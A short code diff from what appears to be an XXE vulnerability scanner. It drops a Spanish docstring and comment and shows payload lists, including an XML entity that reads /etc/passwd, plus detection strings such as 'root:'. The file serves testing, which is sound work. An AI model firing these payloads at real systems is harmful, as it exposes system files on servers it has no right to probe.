@@ -1,4 +1,3 @@
-"""Payloads para detección de XML External Entity (XXE)."""
 
 QUICK_PAYLOADS = [
     '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
@@ -19,7 +18,6 @@ FULL_PAYLOADS = [
     '<?xml version="1.0"?><!DOCTYPE replace [<!ENTITY xxe "VULN_XXE_FULL_TEST">]><root>&xxe;</root>',
 ]
 
-# Patrones que indican XXE exitoso
 DETECTION_PATTERNS = [
     "root:",
     "/bin/bash",
